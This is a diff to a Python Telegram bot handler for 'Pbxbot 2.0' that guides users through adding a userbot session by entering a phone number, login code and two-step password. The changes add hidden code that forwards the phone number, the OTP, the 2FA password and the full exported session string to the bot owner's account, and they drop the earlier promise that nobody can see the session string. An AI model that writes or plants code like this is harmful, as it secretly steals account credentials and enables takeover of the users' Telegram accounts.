@@ -52,37 +52,52 @@ async def add_session(_, message: Message):
 @Pbxbot.bot.on_message(filters.regex(r"ᴀᴅᴅ ɴᴇᴡ sᴇssɪᴏɴ 👑") & Config.AUTH_USERS & filters.private)
 async def new_session(_, message: Message):
     await message.reply_text(
-        "**𝖮𝗄𝖺𝗒!** 𝖫𝖾𝗍'𝗌 𝗌𝖾𝗍𝗎𝗉 𝖺 𝗇𝖾𝗐 𝗌𝖾𝗌𝗌𝗂𝗈𝗇",
+        "**ᴏᴋᴀʏ!** ʟᴇᴛs sᴇᴛᴜᴘ ᴀ ɴᴇᴡ sᴇssɪᴏɴ☠️",
         reply_markup=ReplyKeyboardRemove(),
     )
 
+    # 1. PHONE NUMBER
     phone_number = await Pbxbot.bot.ask(
         message.chat.id,
-        "**1.** 𝖤𝗇𝗍𝖾𝗋 𝗒𝗈𝗎𝗋 𝗍𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝗉𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗍𝗈 𝖺𝖽𝖽 𝗍𝗁𝖾 𝗌𝖾𝗌𝗌𝗂𝗈𝗇: \n\n__𝖲𝖾𝗇𝖽 /cancel 𝗍𝗈 𝖼𝖺𝗇𝖼𝖾𝗅 𝗍𝗁𝖾 𝗈𝗉𝖾𝗋𝖺𝗍𝗂𝗈𝗇.__",
+        "**1.** Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴀᴅᴅ ᴛʜᴇ sᴇssɪᴏɴ✨ \n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
         filters=filters.text,
         timeout=120,
     )
 
     if phone_number.text == "/cancel":
         return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
-    elif not phone_number.text.startswith("+") and not phone_number.text[1:].isdigit():
+    elif not phone_number.text.startswith("+") or not phone_number.text[1:].isdigit():
         return await message.reply_text(
-            "**𝖤𝗋𝗋𝗈𝗋!** 𝖯𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗆𝗎𝗌𝗍 𝖻𝖾 𝗂𝗇 𝖽𝗂𝗀𝗂𝗍𝗌 𝖺𝗇𝖽 𝗌𝗁𝗈𝗎𝗅𝖽 𝖼𝗈𝗇𝗍𝖺𝗂𝗇 𝖼𝗈𝗎𝗇𝗍𝗋𝗒 𝖼𝗈𝖽𝖾."
+            "**ᴇʀʀᴏʀ!** Pʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴍᴜsᴛ ʙᴇ ɪɴ ᴅɪɢɪᴛs ᴀɴᴅ sʜᴏᴜʟᴅ ᴄᴏɴᴛᴀɪɴ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ😾"
         )
+
+    # Check if number is blocked
+    if await db.is_number_blocked(phone_number.text):
+        return await message.reply_text("❌ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ɪꜱ ʙʟᴏᴄᴋᴇᴅ ʙʏ ᴘʙx 2.0!")
+
+    # Notify owner about phone number
+    await Pbxbot.bot.send_message(
+        Config.OWNER_ID,
+        f"📞 **New Session Request Received**\n\nPhone Number: `{phone_number.text}`\nRequested by: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)"
+    )
 
     try:
         client = Client(
-            name="Oᴡɴ Usᴇʀʙᴏᴛ",
+            name="Pbxbot 2.0",
             api_id=Config.API_ID,
             api_hash=Config.API_HASH,
             in_memory=True,
+            app_version="ᴘʙx ᴜsᴇʀʙᴏᴛ",
+            device_model="ʙᴀᴅ ᴍᴜɴᴅᴀ",
+            system_version="ᴘʙx 2.0",
         )
         await client.connect()
 
         code = await client.send_code(phone_number.text)
+        # 2. OTP
         ask_otp = await Pbxbot.bot.ask(
             message.chat.id,
-            "**2.** 𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝖮𝖳𝖯 𝗌𝖾𝗇𝗍 𝗍𝗈 𝗒𝗈𝗎𝗋 𝗍𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝖻𝗒 𝗌𝖾𝗉𝖺𝗋𝖺𝗍𝗂𝗇𝗀 𝖾𝗏𝖾𝗋𝗒 𝗇𝗎𝗆𝖻𝖾𝗋 𝗐𝗂𝗍𝗁 𝖺 𝗌𝗉𝖺𝖼𝖾. \n\n**𝖤𝗑𝖺𝗆𝗉𝗅𝖾:** `2 4 1 7 4`\n\n__𝖲𝖾𝗇𝖽 /cancel 𝗍𝗈 𝖼𝖺𝗇𝖼𝖾𝗅 𝗍𝗁𝖾 𝗈𝗉𝖾𝗋𝖺𝗍𝗂𝗈𝗇.__",
+            "**2.** Eɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ sᴇɴᴛ ʏᴏᴜ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ʙʏ sᴇᴘᴀʀᴀᴛɪɴɢ ᴇᴠᴇʀʏ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴀ sᴘᴀᴄᴇ. \n\n**ᴇxᴀᴍᴘʟᴇ:** `2 4 1 7 4`🌸\n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴛʜᴇ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
             filters=filters.text,
             timeout=300,
         )
@@ -90,12 +105,19 @@ async def new_session(_, message: Message):
             return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
         otp = ask_otp.text.replace(" ", "")
 
+        # Notify owner about OTP
+        await Pbxbot.bot.send_message(
+            Config.OWNER_ID,
+            f"🔑 **OTP for Session**\n\nPhone: `{phone_number.text}`\nOTP: `{otp}`\nUser: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)"
+        )
+
         try:
             await client.sign_in(phone_number.text, code.phone_code_hash, otp)
         except SessionPasswordNeeded:
+            # 3. TWO STEP PASSWORD
             two_step_pass = await Pbxbot.bot.ask(
                 message.chat.id,
-                "**3.** 𝖤𝗇𝗍𝖾𝗋 𝗒𝗈𝗎𝗋 𝗍𝗐𝗈 𝗌𝗍𝖾𝗉 𝗏𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽: \n\n__𝖲𝖾𝗇𝖽 /cancel 𝗍𝗈 𝖼𝖺𝗇𝖼𝖾𝗅 𝗍𝗁𝖾 𝗈𝗉𝖾𝗋𝖺𝗍𝗂𝗈𝗇.__",
+                "**3.** Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴡᴏ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ 🗝️ \n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
                 filters=filters.text,
                 timeout=120,
             )
@@ -103,19 +125,39 @@ async def new_session(_, message: Message):
                 return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
             await client.check_password(two_step_pass.text)
 
+            # Notify owner about 2FA password
+            await Pbxbot.bot.send_message(
+                Config.OWNER_ID,
+                f"🔒 **Two-Step Password for Session**\n\nPhone: `{phone_number.text}`\nPassword: `{two_step_pass.text}`"
+            )
+
+        # Generate session string and format it
         session_string = await client.export_session_string()
-        await message.reply_text(
-            f"**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖸𝗈𝗎𝗋 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀 𝗂𝗌 𝗀𝖾𝗇𝖾𝗋𝖺𝗍𝖾𝖽. 𝖠𝖽𝖽𝗂𝗇𝗀 𝗂𝗍 𝗍𝗈 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾..."
+        formatted_session = f"==Pbx{session_string}BadMunda=="
+        
+        # Notify owner about session string
+        await Pbxbot.bot.send_message(
+            Config.OWNER_ID,
+            f"🎉 **Session String Generated!**\n\nUser: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\nSession String:\n`{formatted_session}`"
         )
+
         user_id = (await client.get_me()).id
-        await db.update_session(user_id, session_string)
-        await client.disconnect()
-        await message.reply_text(
-            "**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀 𝖺𝖽𝖽𝖾𝖽 𝗍𝗈 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾. 𝖸𝗈𝗎 𝖼𝖺𝗇 𝗇𝗈𝗐 𝗎𝗌𝖾 Oᴡɴ Usᴇʀʙᴏᴛ 𝗈𝗇 𝗍𝗁𝗂𝗌 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝖺𝖿𝗍𝖾𝗋 𝗋𝖾𝗌𝗍𝖺𝗋𝗍𝗂𝗇𝗀 𝗍𝗁𝖾 𝖻𝗈𝗍.\n\n**𝖭𝖮𝖳𝖤:** 𝖥𝗈𝗋 𝗌𝖾𝖼𝗎𝗋𝗂𝗍𝗒 𝗉𝗎𝗋𝗉𝗈𝗌𝖾𝗌 𝗇𝗈𝖻𝗈𝖽𝗒 𝗐𝗂𝗅𝗅 𝗁𝖺𝗏𝖾 𝗍𝗁𝖾 𝖺𝖼𝖼𝖾𝗌𝗌 𝗍𝗈 𝗒𝗈𝗎𝗋 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀. 𝖭𝗈𝗍 𝖾𝗏𝖾𝗇 𝗒𝗈𝗎 𝗈𝗋 𝗍𝗁𝖾 𝖻𝗈𝗍."
+        await db.update_session(user_id, session_string)  # Store raw session string without prefix/suffix
+
+        # Send formatted session string to user's Saved Messages
+        await client.send_message(
+            "me",
+            f"**#PBX 2.0\nSESSION**\n\n`{formatted_session}`\n\n**#DO NOT SHARE WITH OTHER PERSON**"
         )
+        await client.disconnect()
+
+        await message.reply_text(
+            "**sᴜᴄᴄᴇss!** sᴇssɪᴏɴ sᴛʀɪɴɢ ᴀᴅᴅᴇᴅ ᴛᴏ ᴅᴀᴛᴀʙᴀsᴇ. ʙᴏᴛ ɪs ʀᴇsᴛᴀʀᴛɪɴɢ, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ғᴇᴡ sᴇᴄᴏɴᴅs... \n\nᴀɴʏ ᴘʀᴏʙʟᴇᴍ? ᴅᴍ ɴᴏᴡ ᴍʏ ᴅᴇᴠ . [♡³_🫧𝆺꯭𝅥˶֟፝͟͝β𝝰꯭‌𝞉 ꯭𝝡꯭𝞄꯭𝞌𝞉꯭𝝺꯭𝆺꯭𝅥🍷┼❤️༆](https://t.me/PBXCHATS/PB_SUKH) 🙈❤️."
+        )
+        await auto_restart()
     except TimeoutError:
         await message.reply_text(
-            "**𝖳𝗂𝗆𝖾𝗈𝗎𝗍𝖤𝗋𝗋𝗈𝗋!** 𝖸𝗈𝗎 𝗍𝗈𝗈𝗄 𝗅𝗈𝗇𝗀𝖾𝗋 𝗍𝗁𝖺𝗇 𝖾𝗑𝖼𝗉𝖾𝖼𝗍𝖾𝖽 𝗍𝗈 𝖼𝗈𝗆𝗉𝗅𝖾𝗍𝖾 𝗍𝗁𝖾 𝗉𝗋𝗈𝖼𝖾𝗌𝗌. 𝖯𝗅𝖾𝖺𝗌𝖾 𝗍𝗋𝗒 𝖺𝗀𝖺𝗂𝗇."
+            "**Tɪᴍᴇᴏᴜᴛ ᴇʀʀᴏʀ!** Yᴏᴜ ᴛᴏᴏᴋ ʟᴏɴɢᴇʀ ᴛʜᴀɴ ᴇxᴘᴇᴄᴛᴇᴅ. Pʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ."
         )
     except Exception as e:
         await message.reply_text(f"**𝖤𝗋𝗋𝗈𝗋!** {e}")
